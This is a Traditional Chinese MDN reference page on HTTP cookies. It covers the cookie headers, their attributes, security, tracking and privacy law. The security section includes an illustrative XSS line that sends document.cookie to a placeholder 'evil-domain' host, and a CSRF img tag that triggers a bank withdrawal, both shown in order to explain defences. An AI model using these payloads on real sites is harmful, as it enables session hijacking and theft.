---
title: HTTP cookies
slug: Web/HTTP/Cookies
---

{{HTTPSidebar}}

_HTTP cookie_（web cookie、browser cookie）為伺服器傳送予使用者瀏覽器的一個小片段資料。瀏覽器可能儲存並於下一次請求回傳 cookie 至相同的伺服器。Cookie 通常被用來保持使用者的登入狀態——如果兩次請求都來自相同的瀏覽器。舉例來說，它記住了[無狀態（stateless）](/zh-TW/docs/Web/HTTP/Overview#HTTP_is_stateless_but_not_sessionless)HTTP 協議的有狀態資訊。

Cookies 主要用於三個目的：

- Session 管理
  - : 帳號登入、購物車、遊戲分數，或任何其他伺服器應該記住的資訊
- 個人化
  - : 使用者設定、佈景主題，以及其他設定
- 追蹤
  - : 記錄並分析使用者行為

Cookies 曾被當作一般的客戶端儲存方式來使用。這在當時 cookie 仍是將資料儲存在客戶端的唯一方法時是合法的，現在則建議使用現代的 storage APIs。Cookies 會被每一個請求發送出去，所以可能會影響效能（尤其是行動裝置的資料連線）。現代客戶端的 storage APIs 為 [Web storage API](/zh-TW/docs/Web/API/Web_Storage_API) （`localStorage` 和 `sessionStorage`）以及 [IndexedDB](/zh-TW/docs/Web/API/IndexedDB_API)。

> **備註：** 要檢視儲存的 cookies（以及其他網頁可以使用的儲存資料），你可以開啟開發者工具中的[儲存檢示器（Storage Inspector）](/zh-TW/docs/Tools/Storage_Inspector)並自儲存樹（storage tree）選擇 Cookies。

## 建立 cookies

收到一個 HTTP 請求時，伺服器可以傳送一個 {{HTTPHeader("Set-Cookie")}} 的標頭和回應。Cookie 通常存於瀏覽器中，並隨著請求被放在{{HTTPHeader("Cookie")}} HTTP 標頭內，傳給同個伺服器。可以註明 Cookie 的有效或終止時間，超過後 Cookie 將不再發送。此外，也可以限制 Cookie 不傳送到特定的網域或路徑。

### `Set-Cookie` 及 `Cookie` 標頭

{{HTTPHeader("Set-Cookie")}} HTTP 回應標頭從伺服器傳送 cookies 至用戶代理。一個簡單的 cookie 可以如下例設定：

```plain
Set-Cookie: <cookie-name>=<cookie-value>
```

這個來自伺服器的標頭告訴客戶端要儲存一個 cookie 。

<div class="note"><p><strong>備註：</strong> 以下是如何在不同的伺服器端應用程式中，使用 <code>Set-Cookie</code> 標頭：</p><p></p><ul><li><a href="https://secure.php.net/manual/en/function.setcookie.php">PHP</a></li><li><a href="https://nodejs.org/dist/latest-v8.x/docs/api/http.html#http_response_setheader_name_value">Node.JS</a></li><li><a href="https://docs.python.org/3/library/http.cookies.html">Python</a></li><li><a href="http://api.rubyonrails.org/classes/ActionDispatch/Cookies.html">Ruby on Rails</a></li></ul></div>

```plain
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]
```

現在隨著每個請求，瀏覽器會使用 {{HTTPHeader("Cookie")}} 標頭將所有先前儲存的 cookies 傳給伺服器。

```plain
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```

### Session cookies

以上創建的 cookie 為 _session cookie_：當客戶端關閉時即被刪除，因為它並沒有註明過期 `Expires` 或可維持的最大時間 `Max-Age`。不過網頁瀏覽器可使用 **session restoring**，讓 session cookies 永久保存，就像瀏覽器從來沒關閉。

### 常駐 cookies

常駐 cookies 不會在客戶關閉後到期，而是在一個特定的日期 (`Expires`) 或一個標明的時間長度後（`Max-Age`）。

```plain
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
```

> **備註：** 當到期日被設定後，時間與日期即為相對於用戶端設定 cookie 的時間，而非伺服器。

### `Secure` 以及 `HttpOnly` cookies

Secure cookie 只有在以加密的請求透過 HTTPS 協議時，傳送給伺服器。但即便是 `Secure` ，敏感的資訊絕對不該存在 cookies 內，因為他們本質上是不安全的，這個旗標不能提供真正的保護。自 Chrome 52 以及 Firefox 52 開始，不安全的網站（`http:`）就不能以 `Secure` 的指示設定 cookies。

為了避免跨站腳本攻擊 ({{Glossary("XSS")}})，JavaScript 的{{domxref("Document.cookie")}} API 無法取得 `HttpOnly` cookies；他們只傳送到伺服器。舉例來說，不需要讓 JavaScript 可以取用仍在伺服器 sessions 中的 cookies 時，就應該立 `HttpOnly` 的旗幟。

```plain
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```

### Cookies 的作用範圍

`Domain` 及 `Path` 的指示定義了 cookie 的作用範圍： cookies 應該被送到哪些 URLs 。

`Domain` 註明了受允許的 hosts 能接收 cookie。若無註明，則預設給[當前文件位置的 host](/zh-TW/docs/Web/API/Document/location)**，不包含 subdomain。** 若 `Domain` _有被註明_，則 subdomains 總是被包含。

舉例來說，當設定 `Domain=mozilla.org` 後，在像 `developer.mozilla.org` 之類的 subdomains 中，cookies 都被包含在內。

`Path` 指出一個必定存在於請求 URL 中的 URL 路徑，使 `Cookie` 標頭能被傳出。%x2F（「/」）字元是資料夾分隔符號，子資料夾也同樣會被匹配。

例如，當設定 `Path=/docs` 後，以下的路徑皆會匹配：

- `/docs`
- `/docs/Web/`
- `/docs/Web/HTTP`

### `SameSite` cookies {{experimental_inline}}

`SameSite` 讓伺服器要求 cookie 不應以跨站請求的方式寄送，某種程度上避免了跨站請求偽造的攻擊（{{Glossary("CSRF")}}）。`SameSite` cookies 目前仍在實驗階段，尚未被所有的瀏覽器支援。

### JavaScript 使用 `Document.cookie` 存取

新的 cookies 亦可經由 JavaScript 的 {{domxref("Document.cookie")}} 屬性生成，且若沒有立 `HttpOnly` 旗幟，已存在的 cookies 可以透過 JavaScript 取得。

```js
document.cookie = "yummy_cookie=choco";
document.cookie = "tasty_cookie=strawberry";
console.log(document.cookie);
// logs "yummy_cookie=choco; tasty_cookie=strawberry"
```

請注意以下[安全性](/zh-TW/docs/Web/HTTP/Cookies#Security)章節的資安問題。JavaScript 可取得的 Cookies 即有被 XSS 攻擊竊取的風險。

## 安全性

> **備註：** 機密或敏感的資訊永遠不應該以 HTTP Cookies 的方式儲存或傳送，因為整個機制的本質是不安全的。

### Session hijacking 以及 XSS

Cookies 常用於網頁應用程式中，識別使用者與其 authenticated session，因此竊取 cookie 可能造成使用者的 authenticated session 被劫持。一般偷取 cookies 的作法包括社交工程（Social Engineering），或利用應用程式中的 {{Glossary("XSS")}} 漏洞。

```js
new Image().src =
  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

Cookie 中的 `HttpOnly` 屬性，能藉由防止透過 JavaScript 取得 cookie 內容，來減少此類型的攻擊。

### Cross-site request forgery (CSRF)

[維基百科](https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery)為 {{Glossary("CSRF")}} 舉了一個好例子。假設在一個未經過濾的對話或論壇中，某人插入了一個並非真實圖片，而是對你銀行伺服器請求領錢的 image：

```html
<img
  src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory" />
```

現在如果你的銀行帳戶仍在登入狀態中，你的 cookies 仍然有效，並且沒有其他的驗證方式，當你載入包含此圖片的 HTML 同時，你的錢即會被轉出。以下是一些避免此情況發生的技術：

- Input filtering 和 {{Glossary("XSS")}} 一樣是重要的。
- 做任何敏感的動作前，都應該要求使用者確認。
- 用於敏感動作的 Cookies 都只應該有短時間的生命週期。
- 更多防範的技巧，參見 [OWASP CSRF prevention cheat sheet](<https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet>)。

## 追蹤及隱私

### 第三方 cookies

Cookies 會帶有他們所屬的網域名。若此網域和你所在的頁面網域相同，cookies 即為*第一方（first-party）cookie*，不同則為*第三方（third-party）cookie*。第一方 cookies 只被送到設定他們的伺服器，但一個網頁可能含有存在其他網域伺服器的圖片或組件（像橫幅廣告）。透過這些第三方組件傳送的 cookies 便是第三方 cookies，經常被用於廣告和網頁上的追蹤。參見 [Google 常用的 cookies 種類](https://www.google.com/policies/technologies/types/)。大部分的瀏覽器預設允許第三方 cookies，但也有些可以阻擋他們的 add-on（例如 [EFF](https://www.eff.org/) 的 [Privacy Badger](https://addons.mozilla.org/zh-TW/firefox/addon/privacy-badger-firefox/)）。

若沒有事先告訴消費者第三方 cookies 的存在，當消費者發現你使用 cookie 時，對你的信任將會受損。因此，公開表明 cookie 的使用（像在隱私權條款中）將減低發現 cookie 時的負面影響。有些國家有關於 cookies 的法律條文。範例可以參見維基百科的 [cookie statement](https://wikimediafoundation.org/wiki/Cookie_statement)。

### Do-Not-Track

對於 cookie 的使用並沒有法律上或技術上的規定，但可利用 {{HTTPHeader("DNT")}} 標頭，指示網頁應用程式關閉頁面的追蹤、或跨站的使用者追蹤。參見{{HTTPHeader("DNT")}} 標頭以獲得更多資訊。

### EU cookie directive

歐洲議會在 [Directive 2009/136/EC](http://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32009L0136) 中定義了歐盟的 cookies 規定，並於 2011 年 5 月 25 日生效。此指示本身並非法律，而是給歐盟會員國要作為法律，需符合之規定的指示。實際的法條可因國制宜。

簡而言之，EU directive 指明要儲存或取得使用者電腦、手機、或其他裝置上的資訊前，都要經過使用者的同意。很多網站加了橫幅告知使用者 cookies 的使用。

參見[維基百科上此章節](https://en.wikipedia.org/wiki/HTTP_cookie#EU_cookie_directive)，並查詢國家的法律以取得最新與最精確的資訊。

### Zombie cookies and Evercookies

Zombie cookies 或「Evercookies」是一個更激進的手段，刻意讓 cookies 在被刪除後重新創造，使其很難被永遠的刪除。這些 cookies 使用 [Web storage API](/zh-TW/docs/Web/API/Web_Storage_API)、Flash Local Shared Objects 和其他的技術，使得當他們被偵測不存在時，就會立刻重新創造。

- [Evercookie by Samy Kamkar](https://github.com/samyk/evercookie)
- [維基百科上的 Zombie cookies](https://en.wikipedia.org/wiki/Zombie_cookie)

## 參見

- {{HTTPHeader("Set-Cookie")}}
- {{HTTPHeader("Cookie")}}
- {{domxref("Document.cookie")}}
- {{domxref("Navigator.cookieEnabled")}}
- [Inspecting cookies using the Storage Inspector](/zh-TW/docs/Tools/Storage_Inspector)
- [Cookie specification: RFC 6265](https://tools.ietf.org/html/rfc6265)
- [Nicholas Zakas article on cookies](https://www.nczonline.net/blog/2009/05/05/http-cookies-explained/)
- [Nicholas Zakas article on cookies and security](https://www.nczonline.net/blog/2009/05/12/cookies-and-security/)
- [HTTP cookie on Wikipedia](https://en.wikipedia.org/wiki/HTTP_cookie)
